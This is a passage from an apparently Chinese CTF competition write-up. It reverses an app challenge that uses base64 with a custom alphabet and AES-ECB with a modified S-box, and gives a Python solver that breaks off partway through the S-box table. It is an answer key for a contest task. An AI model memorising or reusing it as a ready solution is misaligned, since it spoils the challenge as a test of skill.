class="hljs-number">0x30</span>,<span class="hljs-number">0x64</span>]<br>v4=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    v4=(<span class="hljs-number">0x99</span>*v4-<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>    a[i]^=v4<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a[i]),end=<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-comment">#0xed,0x52,0xa0,0xa,0xfc,0x9a,0x82,0x79,0xe7,0xa,0x7e,0xb7,0x74,0x98,0xe9,0xd4</span><br></code></pre></td></tr></table></figure><p>先base64解密再aes_ecb，直接没解出来</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255652158-866367a5-df42-4914-95ff-c295a33eae93.png" class="" title="img"><p>s盒有魔改</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255586463-5ba7765e-76ff-4669-aa79-218389a5e5a6.png" class="" title="img"><p>比赛最后半小时做的，思路顺畅但是看到s盒魔改就五分钟了，ai直接给的脚本没有逆s盒，最后也没交上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><code class="hljs python">b64_str = <span class="hljs-string">&quot;l5FlaXCVBE2ALJgWLpekmm==&quot;</span><br>custom_b64_table = <span class="hljs-string">&quot;0123456789XYZabcdefghijklABCDEFGHIJKLMNOPQRSTUVWmnopqrstuvwxyz+/=&quot;</span><br><br><span class="hljs-comment"># 构造反查表</span><br>b64_rev_table = &#123;char: i <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(custom_b64_table)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_base64_decode</span>(<span class="hljs-params">s</span>):<br>    s = s.rstrip(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    buffer = <span class="hljs-number">0</span><br>    bits = <span class="hljs-number">0</span><br>    output = <span class="hljs-built_in">bytearray</span>()<br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> b64_rev_table:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Invalid character in Base64: <span class="hljs-subst">&#123;char&#125;</span>&quot;</span>)<br>        buffer = (buffer &lt;&lt; <span class="hljs-number">6</span>) + b64_rev_table[char]<br>        bits += <span class="hljs-number">6</span><br>        <span class="hljs-keyword">while</span> bits &gt;= <span class="hljs-number">8</span>:<br>            bits -= <span class="hljs-number">8</span><br>            output.append((buffer &gt;&gt; bits) &amp; <span class="hljs-number">0xFF</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(output)<br><br>cipher_bytes = custom_base64_decode(b64_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;🔐 解码后密文（hex）：&quot;</span>, cipher_bytes.<span class="hljs-built_in">hex</span>().upper())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;🔐 解码后密文（16字节）：&quot;</span>, cipher_bytes.<span class="hljs-built_in">hex</span>().upper())<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IAES</span>:<br>    <span class="hljs-keyword">global</span> new_s_box<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Nk = <span class="hljs-number">4</span><br>        self.Nb = <span class="hljs-number">4</span><br>        self.Nr = <span class="hljs-number">10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Nb = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Nb = Nb + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Nb<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Inv_arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Inv_raws = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Inv_raws = Inv_raws + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Inv_raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">self, raws</span>):<br>        raws = self.Inv_arrays(raws)<br>        raws = <span class="hljs-string">&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> raws])<br>        <span class="hljs-built_in">print</span>(raws)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view2</span>(<span class="hljs-params">self, <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">list</span>[i], <span class="hljs-string">&#x27;2x&#x27;</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">3</span> == <span class="hljs-number">3</span>:  <span class="hljs-comment"># i%4 == 3</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">AddRoundKey</span>(<span class="hljs-params">self, raws, Keys</span>):<br>        AddRoundKey = []<br>        <span class="hljs-keyword">for</span> raw, Key <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(raws, Keys):<br>            AddRoundKey.append(raw ^ Key)<br>        <span class="hljs-keyword">return</span> AddRoundKey<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self, raws</span>):<br>        S_box=new_s_box<br>        raws_S_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_S_box.append(S_box[raw])<br>        <span class="hljs-keyword">return</span> raws_S_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvSubBytes</span>(<span class="hljs-params">self, raws,inv_s_box</span>):<br>        IS_box = inv_s_box<br>        raws_IS_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_IS_box.append(IS_box[raw])<br>        <span class="hljs-keyword">return</span> raws_IS_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvShiftRows</span>(<span class="hljs-params">self, raws</span>):<br>        s13 = raws.pop(<span class="hljs-number">7</span>)<br>        raws.insert(<span class="hljs-number">4</span>, s13)<br>        s2223 = raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        raws[<span class="hljs-number">8</span>:<span class="hljs-number">0</span>] = s2223<br>        s313233 = raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        raws[<span class="hljs-number">12</span>:<span class="hljs-number">0</span>] = s313233<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GMUL</span>(<span class="hljs-params">self, a, b</span>):  <span class="hljs-comment"># Russian Peasant Multiplication algorithm</span><br>        p = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> a <span class="hljs-keyword">and</span> b:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:  <span class="hljs-comment"># b%2</span><br>                p = p ^ a<br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x80</span>:  <span class="hljs-comment"># a=a*x^7(a&gt;0),a &gt;= 2**7(128)</span><br>                a = (a &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x11b</span>  <span class="hljs-comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span><br>            <span class="hljs-keyword">else</span>:<br>                a = a &lt;&lt; <span class="hljs-number">1</span><br>            b = b &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvMixColumns</span>(<span class="hljs-params">self, raws</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i] \<br>                = \<br>                self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i])<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">RotWord</span>(<span class="hljs-params">self, temp</span>):<br>        b0 = temp.pop(<span class="hljs-number">0</span>)<br>        temp.insert(<span class="hljs-number">3</span>, b0)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubWord</span>(<span class="hljs-params">self, temp</span>):<br>        temp = self.SubBytes(temp)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyExpansion</span>(<span class="hljs-params">self, key</span>):<br>        i = <span class="hljs-number">0</span><br>        w = [[<span class="hljs-number">0</span>]] * (self.Nb * (self.Nr + <span class="hljs-number">1</span>))<br>        Rcon = [[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>                ]<br>        <span class="hljs-keyword">while</span> i &lt; self.Nk:<br>            w[i] = ([key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]])<br>            i = i + <span class="hljs-number">1</span><br><br>        i = self.Nk<br><br>        <span class="hljs-keyword">while</span> i &lt; self.Nb * (self.Nr + <span class="hljs-number">1</span>):<br>            temp = w[i - <span class="hljs-number">1</span>].copy()<br>            <span class="hljs-keyword">if</span> i % self.Nk == <span class="hljs-number">0</span>:<br>                temp = self.SubWord(self.RotWord(temp))<br>                temp2 = []<br>                <span class="hljs-keyword">for</span> temp1, Rcon1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(temp, Rcon[(i // self.Nk) - <span class="hljs-number">1</span>]):<br>                    temp2.append(temp1 ^ Rcon1)<br>                temp = temp2<br>            <span class="hljs-keyword">elif</span> self.Nk &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i % self.Nk == <span class="hljs-number">4</span>:<br>                temp = self.SubWord(temp)<br>            w_temp = []<br>            <span class="hljs-keyword">for</span> w1, temp1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - self.Nk], temp):<br>                w_temp.append(w1 ^ temp1)<br>            w[i] = w_temp<br>            i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">IAES</span>(<span class="hljs-params">self, IInput, Cipher_Key,inv_s_box</span>):<br>        IInput = [IInput1 <span class="hljs-keyword">for</span> IInput1 <span class="hljs-keyword">in</span> IInput]<br>        Cipher_Key = [Cipher_Key1 <span class="hljs-keyword">for</span> Cipher_Key1 <span class="hljs-keyword">in</span> Cipher_Key]<br>        KeyExpansion = self.KeyExpansion(Cipher_Key)<br>        keys = []<br>        <span class="hljs-keyword">for</span> Key_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(KeyExpansion) // <span class="hljs-number">4</span>):<br>            keys_temp = (KeyExpansion[<span class="hljs-number">4</span> * Key_index] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">1</span>] + KeyExpansion[<br>                <span class="hljs-number">4</span> * Key_index + <span class="hljs-number">2</span>] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">3</span>])<br>            keys_temp = self.arrays(keys_temp)<br>            keys.append(keys_temp)<br>        IInput = self.arrays(IInput)<br>        self.view(IInput)<br>        self.view(keys[-<span class="hljs-number">1</span>])<br>        IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span>])<br>        self.view(IInput)<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.Nr - <span class="hljs-number">1</span>):<br>            IInput = self.InvShiftRows(IInput)<br>            self.view(IInput)<br>            IInput = self.InvSubBytes(IInput,inv_s_box)<br>            self.view(IInput)<br>            self.view(keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            self.view(IInput)<br>            IInput = self.InvMixColumns(IInput)<br>            self.view(IInput)<br>        IInput = self.InvShiftRows(IInput)<br>        self.view(IInput)<br>        IInput = self.InvSubBytes(IInput,inv_s_box)<br>        self.view(IInput)<br>        self.view(keys[<span class="hljs-number">0</span>])<br>        IInput = self.AddRoundKey(IInput, keys[<span class="hljs-number">0</span>])<br>        self.view(IInput)<br>        IInput = self.Inv_arrays(IInput)<br>        IInput = <span class="hljs-built_in">bytes</span>(IInput)<br>        <span class="hljs-keyword">return</span> IInput<br><br>new_s_box = [<span class="hljs-number">0x31</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x83</span>,<br>             <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x7B</span>,<br>             <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x67</span>,<br>             <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x74</span>,<br>             <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB0</span>,<br>             <span class="hljs-number">0x04</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x45</span>,<br>             <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x20</span>,<br>             <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x16</span>,<br>             <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x90</span>,<br>             <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3E</span>,<br>             <span class="hljs-number">0x40</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x5D</span>, 